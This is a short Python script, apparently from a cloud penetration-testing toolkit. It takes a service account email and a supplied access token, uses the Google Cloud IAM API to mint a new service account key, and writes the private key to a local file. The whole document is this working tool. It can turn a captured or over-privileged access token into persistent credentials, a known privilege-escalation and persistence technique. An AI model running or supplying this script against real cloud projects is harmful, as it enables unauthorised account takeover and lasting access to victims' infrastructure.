import os
from google.oauth2 import service_account
import googleapiclient.discovery
import google.oauth2.credentials
import base64

service_account_email = input('Enter Service Account Email: ')
access_token = input('Enter Access Token: ')

credentials = google.oauth2.credentials.Credentials(access_token)
service = googleapiclient.discovery.build(
    'iam', 'v1', credentials=credentials)

key = service.projects().serviceAccounts().keys().create(
    name='projects/-/serviceAccounts/' + service_account_email, body={}
).execute()

if not key.get('disabled', False):
    print('[+] Created JSON Key')
    json_key_file = base64.b64decode(key['privateKeyData']).decode('utf-8')
    with open('new_service_account_key.json', 'w') as key_file:
        key_file.write(json_key_file)
    print('[+] Saved new service account key to new_service_account_key.json')

else:
    print('[!] Failed to create key')